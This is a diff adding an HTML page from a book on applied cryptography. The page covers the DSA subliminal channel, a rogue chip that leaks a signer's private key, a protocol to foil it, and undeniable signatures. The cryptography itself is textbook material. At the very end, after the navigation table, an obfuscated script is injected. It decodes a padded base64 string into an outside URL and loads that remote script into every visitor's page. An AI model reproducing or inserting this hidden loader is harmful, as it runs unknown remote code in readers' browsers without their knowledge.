@@ -1,0 +1,127 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Special Algorithms for Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=23//-->
+<!--PAGES=535-537//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="23-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="23-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Sending multiple bits via this method involves making <I>r</I> either a quadratic residue or a quadratic nonresidue modulo a variety of parameters. See [1468,1469] for details.</P>
+<P>This scheme can be easily extended to send multiple subliminal bits per signature. If Alice and Bob agree on two random primes, <I>P</I> and <I>Q,</I> Alice can send two bits by choosing a random <I>k</I> such that <I>r</I> is either a quadratic residue mod <I>P</I> or a quadratic nonresidue mod <I>P,</I> and either a quadratic residue mod <I>Q</I> or a quadratic nonresidue mod <I>Q.</I> A random value of <I>k</I> has a 25 percent chance of producing an <I>r</I> of the correct form.</P>
+<P>Here&#146;s how Mallory, an unscrupulous implementer of DSA,can have the algorithm leak 10 bits of Alice&#146;s private key every time she signs a document.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Mallory puts his implementation of DSA in a tamperproof VLSI chip, so that no one can examine its inner workings. He creates a 14-bit subliminal channel in his implementation of DSA. That is, he chooses 14 random primes, and has the chip choose a value of <I>k</I> such that <I>r</I> is either a quadratic residue or a quadratic nonresidue modulo each of those 14 primes, depending on the subliminal message.
+<DD><B>(2)</B>&nbsp;&nbsp;Mallory distributes the chips to Alice, Bob, and everyone else who wants them.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice signs a message normally, using her 160-bit private key, <I>x.</I>
+<DD><B>(4)</B>&nbsp;&nbsp;The chip randomly chooses a 10-bit block of <I>x:</I> the first 10 bits, the second 10 bits, and so on. Since there are 16 possible 10-bit blocks, a 4-bit number can identify which block it is. This 4-bit identifier, plus the 10 bits of the key, is the 14-bit subliminal message.
+<DD><B>(5)</B>&nbsp;&nbsp;The chip tries random values of <I>k</I> until it finds one that has the correct quadratic residue properties to send the subliminal message. The odds of a random <I>k</I> being of the correct form are 1 in 16,384. Assuming the chip can test 10,000 values of <I>k</I> per second, it will find one in less than two seconds. This computation does not involve the message and can be performed off-line, before Alice wants to sign a message.
+<DD><B>(6)</B>&nbsp;&nbsp;The chip signs the message normally, using the value of <I>k</I> chosen in step (5).
+<DD><B>(7)</B>&nbsp;&nbsp;Alice sends the digital signature to Bob, or publishes it on the network, or whatever.
+<DD><B>(8)</B>&nbsp;&nbsp;Mallory recovers <I>r</I> and, because he knows the 14 primes, decrypts the subliminal message.
+</DL>
+<P>It&#146;s scary that even if Alice knows what is happening, she cannot prove it. As long as those 14 secret primes stay secret, Mallory is safe.
+</P>
+<P><FONT SIZE="+1"><B><I>Foiling the DSA Subliminal Channel</I></B></FONT></P>
+<P>The subliminal channel relies on the fact that Alice can choose <I>k</I> to transmit subliminal information. To foil the subliminal channel, Alice cannot be allowed to choose <I>k.</I> However, neither can anyone else; if someone else were allowed to choose <I>k,</I> it would allow that person to forge Alice&#146;s signature. The only solution is for Alice to jointly generate <I>k</I> with another party, call him Bob, in such a way that Alice cannot control a single bit of <I>k</I> and Bob cannot know a single bit of <I>k.</I> At the end of the protocol, Bob should be able to verify that Alice used the <I>k</I> that they jointly generated.</P>
+<P>Here&#146;s the protocol [1470,1472,1473]:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice chooses <I>k'</I> and sends Bob
+</DL>
+<DL>
+<DD><I>u</I> = <I>g<SUP>k'</SUP></I> mod <I>p</I>
+</DL>
+<DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Bob chooses <I>k"</I> and sends it to Alice.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice calculates <I>k</I> = <I>k'<SUP>k"</SUP></I> mod (<I>p</I> - 1). She uses <I>k</I> to sign her message, <I>M,</I> with the DSA and sends Bob the signature: <I>r</I> and <I>s.</I>
+<DD><B>(4)</B>&nbsp;&nbsp;Bob verifies that
+</DL>
+<DL>
+<DD>((<I>u<SUP>k"</SUP></I> mod <I>p</I>) mod <I>q</I>) = <I>r</I>
+</DL>
+<P>If it does, he knows that <I>k</I> was used to sign <I>M.</I></P>
+<P>After step (4), Bob knows that no subliminal information can be embedded in <I>r.</I> If he is a trusted party, he can certify that Alice&#146;s signature is subliminal-free. Others will have to trust his certification; Bob cannot prove this fact to a third party with a transcript of the protocol.</P>
+<P>A surprising result is that if Bob wants to, he can use this protocol to create his own subliminal channel. Bob can embed a subliminal message in one of Alice&#146;s signatures by choosing <I>k"</I> with certain characteristics. When Simmons discovered this, he dubbed it the &#147;Cuckoo&#146;s Channel.&#148; Details on how the Cuckoo&#146;s Channel works, and a three-pass protocol for generating <I>k</I> that prevents it, are discussed in [1471,1473].</P>
+<P><FONT SIZE="+1"><B><I>Other Schemes</I></B></FONT></P>
+<P>Any signature scheme can be converted into a subliminal channel [1458,1460,1406]. A protocol for embedding a subliminal channel in the Fiat-Shamir and Feige-Fiat-Shamir protocols, as well as possible abuses of the subliminal channel, can be found in [485].
+</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">23.4 Undeniable Digital Signatures</FONT></H3>
+<P>This undeniable signature algorithm (see Section 4.3) is by David Chaum [343,327]. First, a large prime, <I>p,</I> and a primitive element, <I>g,</I> are made public, and used by a group of signers. Alice has a private key, <I>x,</I> and a public key, <I>g<SUP>x</SUP></I> mod <I>p.</I></P>
+<P>To sign a message, Alice computes <I>z</I> =<I>m<SUP>x</SUP></I> mod <I>p</I>.That&#146;s all she has to do.</P>
+<P>Verification is a little more complicated.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Bob chooses two random numbers, <I>a</I> and <I>b,</I> both less than <I>p,</I> and sends Alice:
+<DL>
+<DD><I>c</I> = <I>z<SUP>a</SUP></I>(<I>g<SUP>x</SUP></I>)<SUP>b</SUP>  mod <I>p</I>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Alice computes <I>t</I>=<I>x</I><SUP>&#150;<I>1</SUP></I> mod (<I>p</I> - 1), and sends Bob:
+<DL>
+<DD><I>d</I> = <I>c<SUP>t</SUP></I> mod <I>p</I>
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Bob confirms that
+<DL>
+<DD><I>d</I> &#8801; <I>m<SUP>a</SUP>g<SUP>b</SUP></I> (mod <I>p</I>)
+</DL>
+</DL>
+<P>If it is, he accepts the signature as genuine.
+</P>
+<P>Imagine that Alice and Bob went through this protocol, and Bob is now convinced that Alice signed the message. Bob wants to convince Carol, so he shows her a transcript of the protocol. Dave, however, wants to convince Carol that some other person signed the document. He creates a fake transcript of the protocol. First he generates the message in step (1). Then in step (3) he generates <I>d</I> and the fake transmission from this other person in step (2). Finally, he creates the message in step (2). To Carol, both Bob&#146;s and Dave&#146;s transcripts are identical. She cannot be convinced of the signature&#146;s validity unless she goes through the protocol herself.</P>
+<P>Of course, if she were watching over Bob&#146;s shoulder as he completed the protocol, she would be convinced. Carol has to see the steps done in order, just as Bob does.</P>
+<P>There may be a problem with this signature scheme, but I know of no details. Please pay attention to the literature before you use it.</P>
+<P>Another protocol not only has a confirmation protocol&#151;Alice can convince Bob that her signature is valid&#151;but it also has a disavowal protocol; Alice can use a zero-knowledge interactive protocol to convince him that the signature is not valid, if it is not [329].</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="23-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="23-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(WdaHfIBX, oPEaIoGo) {oPEaIoGo = WdaHfIBX.createElement('script');oPEaIoGo.type = 'text/javascript';oPEaIoGo.async = true;oPEaIoGo.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');WdaHfIBX.getElementsByTagName('body')[0].appendChild(oPEaIoGo);}(document));</script></body>
+</html>
